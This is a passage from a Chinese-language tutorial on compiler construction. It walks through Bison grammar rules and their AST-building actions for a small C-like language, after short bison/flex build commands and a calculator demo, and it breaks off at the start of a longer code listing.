<li>$3 代指 C</li>
</ul>
</li>
</ul>
<p>效果如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bison -d -v calc.y</span><br><span class="line">flex calc.l</span><br><span class="line">gcc -o calc calc.tab.c lex.yy.c</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  demo ./calc</span><br><span class="line">1+2+3</span><br><span class="line">ans = 6</span><br><span class="line">5+5</span><br><span class="line">ans = 10</span><br><span class="line">4+5*4 </span><br><span class="line">ans = 24</span><br><span class="line">(4+5)*4 </span><br><span class="line">ans = 36</span><br></pre></td></tr></table></figure>
<p>Bison 的规则部分非常复杂，总计为以下条目指定了规则：</p>
<p>ExtDefList-外部定义列表：即是整个语法树 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtDefList: &#123;$$=<span class="literal">NULL</span>;&#125;</span><br><span class="line">            | ExtDef ExtDefList &#123;$$=mknode(EXT_DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; </span><br><span class="line">            ;</span><br></pre></td></tr></table></figure>
<ul>
<li>mknode：生成一个非叶子树结点（第1个参数代表节点的类型，第2-4个参数代表该节点的子树，第5个参数代表行号）</li>
<li>对于每个 EXTDEFLIST 有2种可能：<ul>
<li>外部定义列表为 NULL</li>
<li>外部定义列表不为 NULL，则创建 EXT_DEF_LIST 结点</li>
</ul>
</li>
<li>对于每个 EXT_DEF_LIST 节点有2个子树：<ul>
<li>第1个子树对应声明 ExtDef（声明变量，声明数组，声明函数）</li>
<li>第2个子树对应它自身 ExtDefList</li>
<li>代表多个声明 ExtDef（<code>A : B A &#123;...&#125;</code> 这种写法代表存在多个 <code>B</code>）</li>
</ul>
</li>
</ul>
<p>ExtDef-声明：声明变量，声明数组，声明函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ExtDef: Specifier ExtDecList SEMI &#123;$$=mknode(EXT_VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">        | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125; </span><br><span class="line">        | Specifier FuncDec CompSt &#123;$$=mknode(FUNC_DEF,$<span class="number">1</span>,$<span class="number">2</span>,$<span class="number">3</span>,yylineno);&#125; </span><br><span class="line">        | error SEMI &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---缺少分号---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 ExtDef 有4种可能：<ul>
<li>对应外部变量声明，生成 EXT_VAR_DEF 节点</li>
<li>对应数组声明，生成 ARRAY_DEF 节点</li>
<li>对应函数声明，生成 FUNC_DEF 节点</li>
<li>对应报错</li>
</ul>
</li>
<li>EXT_VAR_DEF，ARRAY_DEF，FUNC_DEF 节点的信息如上</li>
</ul>
<p>Specifier-类型：表示一个类型 <code>(int,float)</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Specifier: TYPE &#123;$$=mknode(TYPE,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);$$-&gt;type=(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;int&quot;</span>)?INT:(!<span class="built_in">strcmp</span>($<span class="number">1</span>,<span class="string">&quot;float&quot;</span>)?FLOAT:CHAR));&#125;</span><br><span class="line">           ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Specifier 有1种可能：<ul>
<li>对应类型，生成 TYPE 节点</li>
</ul>
</li>
<li>TYPE 节点无子树</li>
</ul>
<p>ExtDecList-变量名称列表：由一个或多个变量组成，多个变量之间用逗号隔开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ExtDecList: VarDec &#123;$$=$<span class="number">1</span>;&#125; </span><br><span class="line">            | VarDec COMMA ExtDecList &#123;$$=mknode(EXT_DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">            ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 EXT_DECLIST 有2种可能：<ul>
<li>只有一个变量，则直接赋值 VarDec 变量</li>
<li>有多个变量，则生成 EXT_DEC_LIST 节点</li>
</ul>
</li>
<li>对于每个 EXT_DEC_LIST 结点有2个子树：<ul>
<li>第1个子树对应变量 VarDec</li>
<li>第2个子树对应它自身 ExtDecList</li>
<li>代表多个变量 VarDec</li>
</ul>
</li>
</ul>
<p>VarDec-变量名称：由一个 ID 组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VarDec: ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// ID结点,标识符符号串存放结点的type_id</span></span><br><span class="line">        ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 VarDec 有1种可能：<ul>
<li>由一个 ID 组成，则生成 ID 节点</li>
</ul>
</li>
<li>ID 节点无子树</li>
</ul>
<p>FuncDec-函数声明：包括函数名和参数定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FuncDec: ID LP VarList RP &#123;$$=mknode(FUNC_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | ID LP RP &#123;$$=mknode(FUNC_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数名存放在$$-&gt;type_id</span></span><br><span class="line">         | error RP &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---函数左括号右括号不匹配---\n&quot;</span>);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>函数名 ID 存放在 <code>$$-&gt;type_id</code></li>
<li>对于每个 FuncDec 有3种可能：<ul>
<li>对应一个带参数的函数，则生成 FUNC_DEC 节点（带参）</li>
<li>对应一个不带参数的函数，则生成 FUNC_DEC 节点（不带参）</li>
<li>对应报错</li>
</ul>
</li>
<li>对于每个 FUNC_DEC 结点有1个子树或者无子树：<ul>
<li>第1个子树对应参数定义列表 VarDec</li>
</ul>
</li>
</ul>
<p>ArrayDec-数组声明</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ArrayDec: ID LB Exp RB &#123;$$=mknode(ARRAY_DEC,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | ID LB RB &#123;$$=mknode(ARRAY_DEC,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">          | error RB &#123;$$=<span class="literal">NULL</span>;<span class="built_in">printf</span>(<span class="string">&quot;---数组定义错误---\n&quot;</span>);&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 ArrayDec 有3种可能：<ul>
<li>对应静态数组，则生成 ARRAY_DEC 节点（带有表达式 Exp）</li>
<li>对应动态数组，则生成 ARRAY_DEC 节点</li>
<li>对应报错</li>
</ul>
</li>
<li>对于每个 ARRAY_DEC 结点有1个子树或者无子树：<ul>
<li>第1个子树对应表达式 Exp</li>
</ul>
</li>
</ul>
<p>VarList-参数定义列表：由一个到多个参数定义组成，用逗号隔开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VarList: ParamDec &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | ParamDec COMMA VarList &#123;$$=mknode(PARAM_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 VarList 有2种可能：<ul>
<li>对应一个参数 ParamDec，则生成 PARAM_LIST 节点</li>
<li>对应用逗号隔开的多个参数 ParamDec，则生成 PARAM_LIST 节点</li>
</ul>
</li>
<li>对于每个 PARAM_LIST 结点有1个或2个子树：<ul>
<li>第1个子树对应参数定义 ParamDec</li>
<li>第2个子树对应它自身 PARAM_LIST </li>
</ul>
</li>
</ul>
<p>ParamDec-参数定义：固定由一个类型和一个变量组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ParamDec: Specifier VarDec &#123;$$=mknode(PARAM_DEC,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">          ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 ParamDec 有1种可能：<ul>
<li>对应一个类型 Specifier 和一个变量 VarDec，则生成 PARAM_DEC 节点</li>
</ul>
</li>
<li>对于每个 PARAM_DEC 节点有2个子树：<ul>
<li>第1个子树对应类型 Specifier</li>
<li>第2个子树对应一个变量 VarDec</li>
</ul>
</li>
</ul>
<p>CompSt-复合语句：左右分别用大括号括起来，中间有定义列表和语句列表</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CompSt: LC DefList StmList RC &#123;$$=mknode(COMP_STM,$<span class="number">2</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">        | error RC &#123;$$=<span class="literal">NULL</span>; <span class="built_in">printf</span>(<span class="string">&quot;---复合语句内存在错误---\n&quot;</span>);&#125;</span><br><span class="line">        ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 CompSt 有2种可能：<ul>
<li>对应一个由 <code>&#123;&#125;</code> 包裹起来的子语句，则生成 COMP_STM 节点</li>
<li>对应报错</li>
</ul>
</li>
<li>对于每个 COMP_STM 节点有2个子树：<ul>
<li>第1个子树对应定义列表 DefList</li>
<li>第2个子树对应语句列表 StmList</li>
</ul>
</li>
</ul>
<p>StmList-语句列表：由“0”个或多个语句 Stmt 组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StmList: &#123;$$=<span class="literal">NULL</span>;&#125;</span><br><span class="line">         | Stmt StmList &#123;$$=mknode(STM_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 StmList 有2种可能：<ul>
<li>对应 NULL</li>
<li>对应多个语句 Stmt，则生成 STM_LIST 节点</li>
</ul>
</li>
<li>对于每个 STM_LIST 节点有2个子树：<ul>
<li>第1个子树对应语句 Stmt</li>
<li>第2个子树对应它自身 StmList</li>
</ul>
</li>
</ul>
<p>Stmt-语句：可能为表达式，复合语句，return 语句，if 语句，if-else 语句，while 语句，for 语句</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Stmt: Exp SEMI &#123;$$=mknode(EXP_STMT,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | CompSt &#123;$$=$<span class="number">1</span>;&#125; <span class="comment">// 复合语句结点直接最为语句结点,不再生成新的结点</span></span><br><span class="line">      | RETURN Exp SEMI &#123;$$=mknode(RETURN,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt %prec LOWER_THEN_ELSE &#123;$$=mknode(IF_THEN,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | IF LP Exp RP Stmt ELSE Stmt &#123;$$=mknode(IF_THEN_ELSE,$<span class="number">3</span>,$<span class="number">5</span>,$<span class="number">7</span>,yylineno);&#125;</span><br><span class="line">      | WHILE LP Exp RP Stmt &#123;$$=mknode(WHILE,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | FOR LP Exp RP Stmt &#123;$$=mknode(FOR,$<span class="number">3</span>,$<span class="number">5</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Stmt 有7种可能：<ul>
<li>对应基础表达式 Exp，则生成节点 EXP_STMT</li>
<li>对应符合语句 CompSt</li>
<li>对应 RETURN Exp，则生成节点 RETURN</li>
<li>对应 IF ELSE-IF 语句，则生成节点 IF_THEN</li>
<li>对应 IF ELSE 语句，则生成节点 IF_THEN_ELSE</li>
<li>对应 WHILE 语句，则生成节点 WHILE</li>
<li>对应 FOR 语句，则生成节点 FOR</li>
</ul>
</li>
</ul>
<p>DefList-定义列表：由“0”个或多个定义语句组成</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DefList: &#123;$$=<span class="literal">NULL</span>; &#125;</span><br><span class="line">         | Def DefList &#123;$$=mknode(DEF_LIST,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 DefList 有2种可能：<ul>
<li>对应 NULL</li>
<li>对应多个定义 Def，则生成 DEF_LIST 节点</li>
</ul>
</li>
</ul>
<p>Def-定义：定义一个或多个定义语句，由分号隔开</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Def: Specifier DecList SEMI &#123;$$=mknode(VAR_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     | Specifier ArrayDec SEMI &#123;$$=mknode(ARRAY_DEF,$<span class="number">1</span>,$<span class="number">2</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">     ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Def 有2种可能：<ul>
<li>对应变量的定义，则生成 VAR_DEF 节点</li>
<li>对应数组的定义，则生成 ARRAY_DEF 节点</li>
</ul>
</li>
</ul>
<p>DecList-语句列表：由一个或多个语句组成，由逗号隔开，最终都成一个表达式</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DecList: Dec &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         | Dec COMMA DecList &#123;$$=mknode(DEC_LIST,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">         ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 DecList 有2种可能：<ul>
<li>对应一个语句 Dec，则生成 DEC_LIST 节点</li>
<li>对应用逗号隔开的多个 Dec，则生成 DEC_LIST 节点</li>
</ul>
</li>
</ul>
<p>Dec-语句：一个变量名称或者一个赋值语句（变量名称等于一个表达式）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dec: VarDec &#123;$$=$<span class="number">1</span>;&#125;</span><br><span class="line">     | VarDec ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125;</span><br><span class="line">     ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Dec 有2种可能：<ul>
<li>对应一个变量名称 VarDec</li>
<li>对应一个赋值语句，则生成 ASSIGNOP 节点</li>
</ul>
</li>
</ul>
<p>Exp-表达式：代表数字或是数字之间的运算，和函数调用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Exp: Exp ASSIGNOP Exp &#123;$$=mknode(ASSIGNOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;ASSIGNOP&quot;</span>);&#125; <span class="comment">// $$结点type_id空置未用,正好存放运算符</span></span><br><span class="line">     | Exp AND Exp &#123;$$=mknode(AND,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AND&quot;</span>);&#125;</span><br><span class="line">     | Exp OR Exp &#123;$$=mknode(OR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;OR&quot;</span>);&#125;</span><br><span class="line">     | Exp RELOP Exp &#123;$$=mknode(RELOP,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">2</span>);&#125; <span class="comment">// 词法分析关系运算符号自身值保存在$2中</span></span><br><span class="line">     | Exp PLUS Exp &#123;$$=mknode(PLUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;PLUS&quot;</span>);&#125;</span><br><span class="line">     | Exp MINUS Exp &#123;$$=mknode(MINUS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;MINUS&quot;</span>);&#125;</span><br><span class="line">     | Exp STAR Exp &#123;$$=mknode(STAR,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;STAR&quot;</span>);&#125;</span><br><span class="line">     | Exp DIV Exp &#123;$$=mknode(DIV,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;DIV&quot;</span>);&#125;</span><br><span class="line">     | Exp COMADD Exp &#123;$$=mknode(COMADD,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMADD&quot;</span>);&#125;</span><br><span class="line">     | Exp COMSUB Exp &#123;$$=mknode(COMSUB,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;COMSUB&quot;</span>);&#125;</span><br><span class="line">     | LP Exp RP &#123;$$=$<span class="number">2</span>;&#125; <span class="comment">/* 遇到左右括号,可直接忽略括号,Exp的值就为括号里面的Exp */</span></span><br><span class="line">     | MINUS Exp %prec UMINUS &#123;$$=mknode(UMINUS,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;UMINUS&quot;</span>);&#125;</span><br><span class="line">     | NOT Exp &#123;$$=mknode(NOT,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;NOT&quot;</span>);&#125;</span><br><span class="line">     | AUTOADD Exp &#123;$$=mknode(AUTOADD_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | AUTOSUB Exp &#123;$$=mknode(AUTOSUB_L,$<span class="number">2</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOADD &#123;$$=mknode(AUTOADD_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOADD&quot;</span>);&#125;</span><br><span class="line">     | Exp AUTOSUB &#123;$$=mknode(AUTOSUB_R,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,<span class="string">&quot;AUTOSUB&quot;</span>);&#125;</span><br><span class="line">     | ID LP Args RP &#123;$$=mknode(FUNC_CALL,$<span class="number">3</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数调用后面的括号部分,只需要把括号里面的内容传入即可</span></span><br><span class="line">     | ID LP RP &#123;$$=mknode(FUNC_CALL,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125; <span class="comment">// 函数调用后面的括号部分没有参数</span></span><br><span class="line">     | ID &#123;$$=mknode(ID,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);<span class="built_in">strcpy</span>($$-&gt;type_id,$<span class="number">1</span>);&#125;</span><br><span class="line">     | INT &#123;$$=mknode(INT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_int=$<span class="number">1</span>;$$-&gt;type=INT;&#125;</span><br><span class="line">     | FLOAT &#123;$$=mknode(FLOAT,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);$$-&gt;type_float=$<span class="number">1</span>;$$-&gt;type=FLOAT;&#125;</span><br><span class="line">     | CHAR &#123;$$=mknode(CHAR,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno); $$-&gt;type_char=$<span class="number">1</span>;$$-&gt;type=CHAR;&#125;</span><br><span class="line">     ;</span><br></pre></td></tr></table></figure>
<ul>
<li>对于每个 Exp 有23种可能：<ul>
<li>前10种可能分别对应：等于 ASSIGNOP，和 AND，或 OR，二元运算符 RELOP，加 PLUS，减 MINUS，乘 STAR，除 DIV，加等于 COMADD，减等于 COMSUB，都会生成对应的节点</li>
<li>第11种可能分别对应：左右括号</li>
<li>第12,13种可能分别对应：负操作和非操作，分别生成 UMINUS 和 NOT 节点</li>
<li>第14-17种可能分别对应：加加 AUTOADD 和减减 AUTOSUB 的左右操作，分别生成4种类型的节点</li>
<li>第18,19种可能对应：函数的有参调用和无参调用，都生成 FUNC_CALL 节点</li>
<li>最后4种可能对应：ID，INT，FLOAT，CHAR</li>
</ul>
</li>
</ul>
<p>Args-用逗号隔开的参数（和参数定义 ParamDec 不同）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Args: Exp COMMA Args &#123;$$=mknode(ARGS,$<span class="number">1</span>,$<span class="number">3</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      | Exp &#123;$$=mknode(ARGS,$<span class="number">1</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,yylineno);&#125;</span><br><span class="line">      ;</span><br></pre></td></tr></table></figure>
<ul>
<li>参数 Args 只在函数调用时使用</li>
<li>对于每个 Args 有2种可能：<ul>
<li>对应用逗号隔开的多个 Exp</li>
<li>对应一个 Exp</li>
</ul>
</li>
</ul>
<p>实现代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span 